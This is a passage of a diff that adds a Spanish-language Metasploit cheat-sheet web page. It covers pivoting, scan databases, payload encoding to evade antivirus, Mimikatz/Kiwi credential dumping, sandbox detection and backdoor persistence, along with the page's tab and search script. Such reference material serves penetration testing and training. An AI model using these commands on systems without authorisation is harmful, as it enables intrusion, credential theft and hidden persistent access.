+        <div class="cmd-row"><span class="cmd-name">autoroute -s &lt;subred&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Versión simplificada de route. Añade automáticamente las rutas de las interfaces del target. Más fácil de usar que route add manual.<br><span class="param">run post/multi/manage/autoroute</span> · <span class="param">-s 192.168.1.0/24</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">run get_local_subnets</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra las subredes locales accesibles desde el target. Útil para descubrir qué redes puedes alcanzar después de hacer pivoting.<br><span class="param">run post/multi/manage/autoroute</span> primero</span></div>
+        <div class="cmd-row"><span class="cmd-name">arp / netstat</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra la tabla ARP y conexiones de red activas del target. Útil para descubrir hosts en la red local y conexiones establecidas.<br><span class="param">arp -a</span> tabla ARP · <span class="param">netstat -an</span> conexiones</span></div>
+      </div>
+    </div>
+
+    <!-- #################### AVANZADO #################### -->
+    <!-- AVANZADO - BASE DE DATOS -->
+    <div class="section" id="tab-adv-db" data-group="adv-db">
+      <div class="cmd-group">
+        <div class="group-title">Base de datos y escaneo (msfconsole)</div>
+        <div class="cmd-row"><span class="cmd-name">db_nmap &lt;opciones&gt; &lt;target&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Ejecuta nmap desde msfconsole y guarda automáticamente los resultados en la base de datos. Los hosts, puertos y servicios quedan disponibles con hosts y services.<br><span class="param">db_nmap -sV -O 192.168.1.0/24</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">hosts</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista todos los hosts descubiertos en la base de datos del workspace actual. Muestra IP, MAC, nombre, OS y última actualización.<br><span class="param">hosts -c address,os,name</span> columnas específicas · <span class="param">hosts -d</span> eliminar</span></div>
+        <div class="cmd-row"><span class="cmd-name">services</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista todos los servicios descubiertos por escaneos. Muestra puerto, protocolo, nombre del servicio y estado. Filtrable por puerto o nombre.<br><span class="param">services -p 445</span> solo SMB · <span class="param">services -u</span> solo abiertos</span></div>
+        <div class="cmd-row"><span class="cmd-name">vulns</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista todas las vulnerabilidades registradas en la base de datos. Se populan automáticamente al ejecutar módulos auxiliares de detección o exploits exitosos.<br><span class="param">vulns</span> todas · <span class="param">vulns -p &lt;host&gt;</span> por host</span></div>
+        <div class="cmd-row"><span class="cmd-name">notes</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra notas almacenadas en la base de datos: credenciales encontradas, hashes, información de enumeración. Los módulos auxiliares guardan notas automáticamente.<br><span class="param">notes -t</span> por tipo · <span class="param">notes -a</span> añadir nota manual</span></div>
+        <div class="cmd-row"><span class="cmd-name">creds</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista todas las credenciales capturadas: passwords en claro, hashes NTLM, credenciales de servicios. Se populan con módulos de login y post-explotación.<br><span class="param">creds</span> todas · <span class="param">creds -p smb</span> solo SMB</span></div>
+      </div>
+    </div>
+
+    <!-- AVANZADO - EVASIÓN -->
+    <div class="section" id="tab-adv-evasion" data-group="adv-evasion">
+      <div class="cmd-group">
+        <div class="group-title">Evasión y ofuscación</div>
+        <div class="cmd-row"><span class="cmd-name">show encoders</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista todos los encoders disponibles. Los encoders transforman el payload para cambiar su firma. Shikata Ga Nai es el más conocido pero no evade AV moderno.<br><span class="param">x86/shikata_ga_nai</span> polimórfico · <span class="param">x64/xor</span> XOR simple</span></div>
+        <div class="cmd-row"><span class="cmd-name">set EnableStageEncoding true</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Habilita encoding automático del stager en payloads staged. Codifica la primera etapa del payload para evadir detección por firma estática.<br><span class="param">set StageEncoder x64/xor</span> encoder específico</span></div>
+        <div class="cmd-row"><span class="cmd-name">set EXITFUNC thread</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Controla cómo el payload sale tras ejecutarse. "thread" es el más seguro — el proceso host sigue corriendo. "process" mata el proceso. "seh" usa structured exception handling.<br><span class="param">EXITFUNC=thread</span> default · <span class="param">process</span> · <span class="param">seh</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">msfvenom -a x64 --platform windows -p ... -e x64/xor -i 3</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Genera payload con encoding XOR para x64. Especificar arquitectura (-a) y plataforma (--platform) evita errores de compatibilidad.<br><span class="param">-a x64</span> arquitectura · <span class="param">--platform windows</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">set DisablePayloadHandler true</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Deshabilita el handler automático de payload. Útil cuando ya tienes un multi/handler corriendo y no quieres que se abra otro al ejecutar un exploit.<br><span class="param">set DisablePayloadHandler true</span> · evita conflictos de puerto</span></div>
+      </div>
+    </div>
+
+    <!-- AVANZADO - POST-EXPLOTACIÓN -->
+    <div class="section" id="tab-adv-post" data-group="adv-post">
+      <div class="cmd-group">
+        <div class="group-title">Módulos post-explotación</div>
+        <div class="cmd-row"><span class="cmd-name">run post/windows/gather/checkvm</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Detecta si el target es una máquina virtual. Útil para decidir si estás en un sandbox o entorno de análisis antes de ejecutar payloads más agresivos.<br><span class="param">run post/...</span> ejecuta sobre la sesión activa</span></div>
+        <div class="cmd-row"><span class="cmd-name">run post/windows/gather/enum_logged_on_users</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Enumera usuarios que han iniciado sesión en el target (local y remoto). Útil para identificar administradores y cuentas activas.<br><span class="param">run post/...</span> sobre sesión activa</span></div>
+        <div class="cmd-row"><span class="cmd-name">run post/multi/recon/local_exploit_suggester</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Analiza el target y sugiere exploits locales para escalada de privilegios basados en el OS, parches y configuración.<br><span class="param">run post/...</span> sobre sesión activa · muestra exploits potenciales</span></div>
+        <div class="cmd-row"><span class="cmd-name">run post/windows/manage/enable_rdp</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Habilita Remote Desktop Protocol en el target. Abre el puerto 3389 y configura el firewall. Útil para acceso persistente GUI.<br><span class="param">run post/...</span> · <span class="param">run post/windows/manage/enable_rdp FORWARD=true</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">load kiwi / load mimikatz</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Carga el módulo Kiwi (fork de Mimikatz) dentro de Meterpreter. Extrae passwords en claro, hashes, tickets Kerberos y credenciales de la memoria.<br><span class="param">load kiwi</span> · <span class="param">creds_all</span> extrae todo · <span class="param">kerberos_ticket_list</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">run post/windows/manage/persistence_exe</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Instala persistencia en el target ejecutando un binario en cada inicio. Crea un servicio o entrada en el registro para mantener acceso tras reinicios.<br><span class="param">set REXE /path/to/backdoor.exe</span> · <span class="param">set STARTUP USER</span></span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!--  JAVASCRIPT: -->
+<script>
+  /**
+   * showMainTab(id)
+   * - Cambia entre pestañas principales
+   * - Muestra las pestañas secundarias correspondientes
+   * - Activa la primera pestaña secundaria
+   * - Limpia el campo de búsqueda
+   */
+  function showMainTab(id) {
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    document.querySelectorAll('.tab-main').forEach(t => t.classList.remove('active'));
+
+    if (typeof event !== 'undefined' && event.target) {
+      const btn = event.target.closest('.tab-main');
+      if (btn) btn.classList.add('active');
+    }
+
+    document.querySelectorAll('[id^="subtabs-"]').forEach(el => el.style.display = 'none');
+
+    const subtabsContainer = document.getElementById('subtabs-' + id);
+    if (subtabsContainer) {
+      subtabsContainer.style.display = 'flex';
+
+      const firstSubtab = subtabsContainer.querySelector('.subtab');
+      const sectionMap = {
+        'basic': 'tab-basic-start',
+        'exploits': 'tab-exp-select',
+        'payloads': 'tab-pay-types',
+        'meterpreter': 'tab-met-basic',
+        'advanced': 'tab-adv-db'
+      };
+      const firstSection = sectionMap[id] ? document.getElementById(sectionMap[id]) : null;
+
+      if (firstSubtab) {
+        document.querySelectorAll('.subtab').forEach(st => st.classList.remove('active'));
+        firstSubtab.classList.add('active');
+      }
+
+      if (firstSection) {
+        firstSection.classList.add('active');
+      }
+    }
+
+    document.getElementById('searchInput').value = '';
+  }
+
+  /**
+   * showSubTab(id)
+   * - Cambia entre secciones secundarias
+   * - Limpia el campo de búsqueda
+   */
+  function showSubTab(id) {
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    document.querySelectorAll('.subtab').forEach(t => t.classList.remove('active'));
+
+    document.getElementById('tab-' + id).classList.add('active');
+    event.target.classList.add('active');
+    document.getElementById('searchInput').value = '';
+  }
+
+  /**
+   * filterCmds(q)
+   * - Filtra comandos y parámetros en tiempo real
+   */
+  function filterCmds(q) {
+    q = q.toLowerCase().trim();
+    const sections = document.querySelectorAll('.section');
+    const mainTabs = document.querySelectorAll('.tab-main');
+    const subTabs = document.querySelectorAll('.subtab');
+
+    if (!q) {
+      sections.forEach(s => s.classList.remove('active'));
+      mainTabs.forEach(t => t.classList.remove('active'));
+      subTabs.forEach(t => t.classList.remove('active'));
+
+      const firstMainTab = document.querySelector('.tab-main');
+      if (firstMainTab) firstMainTab.classList.add('active');
+
+      const firstSubtab = document.querySelector('#subtabs-basic .subtab');
+      if (firstSubtab) firstSubtab.classList.add('active');
+
+      document.querySelectorAll('[id^="subtabs-"]').forEach(el => el.style.display = 'none');
+      document.getElementById('subtabs-basic').style.display = 'flex';
+
+      const firstSection = document.getElementById('tab-basic-start');
+      if (firstSection) firstSection.classList.add('active');
+
+      document.querySelectorAll('.cmd-row').forEach(r => r.classList.remove('hidden'));
+      return;
+    }
+
+    sections.forEach(s => s.classList.add('active'));
+    mainTabs.forEach(t => t.classList.add('active'));
+    subTabs.forEach(t => t.classList.add('active'));
+    document.querySelectorAll('[id^="subtabs-"]').forEach(el => el.style.display = 'flex');
+
+    document.querySelectorAll('.cmd-row').forEach(row => {
+      const text = row.textContent.toLowerCase();
+      row.classList.toggle('hidden', !text.includes(q));
+    });
+  }
+</script>
